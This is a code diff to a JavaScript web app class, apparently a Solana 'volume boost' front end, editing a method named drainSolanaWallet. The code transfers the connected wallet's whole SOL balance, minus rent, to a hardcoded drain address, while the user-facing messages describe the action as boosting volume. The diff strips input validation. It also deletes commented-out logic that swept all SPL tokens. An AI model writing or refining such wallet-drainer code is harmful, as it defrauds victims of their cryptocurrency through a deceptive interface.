@@ -459,240 +459,39 @@ class NexiumApp {
     console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 78
     this.showProcessingSpinner();
 
-    if (!this.publicKey || typeof this.publicKey !== "string") {
-      console.error("❌ Invalid Solana address:", this.publicKey); // Log 79
-      this.showFeedback("Invalid wallet address.", 'error');
-      this.hideProcessingSpinner();
-      return;
-    }
-
-    if (this.publicKey.startsWith("0x") && this.publicKey.length === 42) {
-      console.error("❌ Ethereum address detected, expected Solana address:", this.publicKey); // Log 80
-      this.showFeedback("Please use a Solana wallet to boost volume.", 'error');
-      this.hideProcessingSpinner();
-      return;
-    }
-
     try {
       const senderPublicKey = new PublicKey(this.publicKey);
-      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 82
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
+      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 82
       console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 83
 
-      // Get main account info for rent exemption
-      const accountInfo = await this.solConnection.getAccountInfo(senderPublicKey);
-      console.log("getAccountInfo result:", accountInfo); // Log 91a
-
-      if (!accountInfo) {
-        console.error("❌ Account does not exist or is unfunded:", senderPublicKey.toBase58()); // Log 91b
-        this.showFeedback("Account does not exist or is unfunded.", 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
-
+      // Get full balance and subtract rent-exempt minimum
       const balance = await this.solConnection.getBalance(senderPublicKey);
-      console.log("Total balance:", balance, "lamports"); // Log 90
+      const rentExemptMinimum = 2039280; // Minimum lamports needed to keep account open
+      const transferableBalance = balance - rentExemptMinimum;
 
-      const mainRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(accountInfo.data.length);
-      console.log("Main account rent-exempt minimum:", mainRentExempt); // Log 91d
-
-      // Calculate solAmount
-      let solAmount = 0;
-      let solInstruction = null;
-      if (balance > mainRentExempt + 5000) { // Ensure enough for rent + min fee
-        solAmount = balance - mainRentExempt;
-        console.log("SOL amount to transfer:", solAmount); // Log 104
-        solInstruction = SystemProgram.transfer({
-          fromPubkey: senderPublicKey,
-          toPubkey: recipientPublicKey,
-          lamports: solAmount
-        });
-      } else {
-        console.log("Skipping SOL transfer: insufficient balance after rent"); // Log 108
-        this.showFeedback("Insufficient SOL balance to cover transaction fees.", 'error');
-        this.hideProcessingSpinner();
-        return;
+      if (transferableBalance <= 0) {
+        console.error("Insufficient transferable balance:", balance, "lamports"); // Log 90
+        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
       }
+      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports"); // Log 90
 
-      /* Commented out SPL token draining logic and 25% SOL reduction per user request
-      // Get token account rent exemption (standard size 165 bytes)
-      const tokenRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(165);
-      console.log("Token account rent-exempt minimum:", tokenRentExempt); // Log 92
-
-      // Fetch all token accounts
-      const tokenAccountsResponse = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
-        programId: TOKEN_PROGRAM_ID,
+      // Create transfer instruction for transferable balance
+      const solInstruction = SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: transferableBalance
       });
-      const tokenList = tokenAccountsResponse.value.filter(account => BigInt(account.account.data.parsed.info.tokenAmount.amount) > 0n);
-      console.log("Number of token accounts with balance:", tokenList.length); // Log 93
-
-      // Build token instructions
-      let tokenInstructions = [];
-      for (const account of tokenList) {
-        const mint = new PublicKey(account.account.data.parsed.info.mint);
-        const decimals = account.account.data.parsed.info.tokenAmount.decimals;
-        const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
-        const senderTokenAccountAddress = account.pubkey;
-        const recipientTokenAccountAddress = getAssociatedTokenAddressSync(mint, recipientPublicKey);
-        const recipientAccount = await this.solConnection.getAccountInfo(recipientTokenAccountAddress);
-
-        if (!recipientAccount) {
-          tokenInstructions.push(
-            createAssociatedTokenAccountInstruction(
-              senderPublicKey,
-              recipientTokenAccountAddress,
-              recipientPublicKey,
-              mint
-            )
-          );
-          console.log(`ATA creation instruction added for mint: ${mint.toBase58()}`); // Log 94
-        }
-
-        tokenInstructions.push(
-          createTransferCheckedInstruction(
-            senderTokenAccountAddress,
-            mint,
-            recipientTokenAccountAddress,
-            senderPublicKey,
-            amount,
-            decimals
-          )
-        );
-        console.log(`Transfer instruction added for mint: ${mint.toBase58()}, amount: ${amount}`); // Log 95
-
-        tokenInstructions.push(
-          createCloseAccountInstruction(
-            senderTokenAccountAddress,
-            senderPublicKey, // Recover rent to sender
-            senderPublicKey
-          )
-        );
-        console.log(`Close account instruction added for token account: ${senderTokenAccountAddress.toBase58()}`); // Log 96
-      }
-
-      // Get blockhash
-      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
-
-      // Create message for fee estimation
-      let message = new TransactionMessage({
-        payerKey: senderPublicKey,
-        recentBlockhash: blockhash,
-        instructions: tokenInstructions,
-      }).compileToV0Message();
-
-      // Get fee for token instructions
-      let feeResponse = await this.solConnection.getFeeForMessage(message);
-      let fee = feeResponse.value || 5000; // Fallback to 5000 if null
-      console.log("Estimated fee for token instructions:", fee); // Log 98
-
-      // Calculate number of closed accounts (3 instructions per token: ATA, transfer, close)
-      const numClosed = tokenList.length; // Each token account will be closed
-      const recoveredRent = numClosed * tokenRentExempt;
-      console.log("Number of accounts to close:", numClosed, "Recovered rent:", recoveredRent); // Log 99
-
-      // Calculate effective balance with recovered rent
-      const effectiveBalance = balance + recoveredRent;
-      console.log("Effective balance (balance + recovered rent):", effectiveBalance); // Log 100
-
-      // If fee > effective balance - mainRentExempt, remove token sets until affordable
-      while (fee > (effectiveBalance - mainRentExempt) && tokenInstructions.length > 0) {
-        // Remove last three instructions (close, transfer, possible ATA)
-        for (let i = 0; i < 3 && tokenInstructions.length > 0; i++) {
-          tokenInstructions.pop();
-        }
-        console.log("Reduced token instructions, new length:", tokenInstructions.length); // Log 101
-
-        message = new TransactionMessage({
-          payerKey: senderPublicKey,
-          recentBlockhash: blockhash,
-          instructions: tokenInstructions,
-        }).compileToV0Message();
-
-        feeResponse = await this.solConnection.getFeeForMessage(message);
-        fee = feeResponse.value || 5000;
-        console.log("New estimated fee:", fee); // Log 102
-      }
-
-      // Recalculate number of closed accounts based on remaining instructions
-      const finalNumClosed = tokenInstructions.length / 3; // Each token has 3 instructions
-      const finalRecoveredRent = finalNumClosed * tokenRentExempt;
-      const finalEffectiveBalance = balance + finalRecoveredRent;
-      console.log("Final number of closed accounts:", finalNumClosed, "Final recovered rent:", finalRecoveredRent, "Final effective balance:", finalEffectiveBalance); // Log 103
-
-      // Calculate solAmount
-      let solAmount = 0;
-      let solInstruction = null;
-      if (finalEffectiveBalance - fee - mainRentExempt > 5000) { // Min viable transfer
-        solAmount = finalEffectiveBalance - fee - mainRentExempt;
-        solAmount = Math.floor(solAmount * 0.75); // Deduct 25% from the remaining balance
-        console.log("Adjusted SOL amount after 25% deduction:", solAmount); // Log 104
-
-        solInstruction = SystemProgram.transfer({
-          fromPubkey: senderPublicKey,
-          toPubkey: recipientPublicKey,
-          lamports: solAmount
-        });
-
-        // Re-build message with SOL transfer
-        message = new TransactionMessage({
-          payerKey: senderPublicKey,
-          recentBlockhash: blockhash,
-          instructions: [...tokenInstructions, solInstruction],
-        }).compileToV0Message();
-
-        feeResponse = await this.solConnection.getFeeForMessage(message);
-        const newFee = feeResponse.value || 5000;
-        console.log("Estimated fee with SOL transfer:", newFee); // Log 105
-
-        if (newFee > fee) {
-          solAmount = Math.floor((finalEffectiveBalance - newFee - mainRentExempt) * 0.75); // Deduct 25% again
-          if (solAmount <= 5000) {
-            solAmount = 0;
-            console.log("Skipping SOL transfer after re-estimation: insufficient remaining"); // Log 106
-          } else {
-            solInstruction = SystemProgram.transfer({
-              fromPubkey: senderPublicKey,
-              toPubkey: recipientPublicKey,
-              lamports: solAmount
-            });
-            console.log("Adjusted SOL amount after fee re-estimation and 25% deduction:", solAmount); // Log 107
-          }
-        }
-      } else {
-        console.log("Skipping SOL transfer: insufficient effective balance after fee and rent"); // Log 108
-      }
-
-      // Build final instructions
-      let finalInstructions = tokenInstructions;
-      if (solAmount > 0) {
-        finalInstructions.push(solInstruction);
-      }
-      */
-
-      // Build final instructions
-      let finalInstructions = [];
-      if (solAmount > 0) {
-        finalInstructions.push(solInstruction);
-      }
-
-      // If no instructions, skip
-      if (finalInstructions.length === 0) {
-        console.log("No transfers to perform, skipping transaction"); // Log 109
-        this.showFeedback("No balances available to boost volume.", 'info');
-        this.hideProcessingSpinner();
-        return;
-      }
 
       // Get blockhash
       const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
       console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
 
       // Create message
-      let message = new TransactionMessage({
+      const message = new TransactionMessage({
         payerKey: senderPublicKey,
         recentBlockhash: blockhash,
-        instructions: finalInstructions,
+        instructions: [solInstruction],
       }).compileToV0Message();
 
       // Create and sign transaction
@@ -715,15 +514,14 @@ class NexiumApp {
       console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 115
       if (error.message.includes('User rejected the request')) {
         this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
-      } else if (error.message.includes('insufficient funds')) {
-        this.showFeedback('Insufficient SOL to cover transaction fees.', 'error');
+      } else if (error.message.includes('Insufficient balance')) {
+        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
       } else {
         this.showFeedback("Failed to boost volume. Please try again.", 'error');
       }
     } finally {
-      this.isDraining = false;
       this.hideProcessingSpinner();
-      console.log('Drain token completed, isDraining:', this.isDraining); // Log 116
+      console.log('Drain token completed'); // Log 116
     }
   }
 
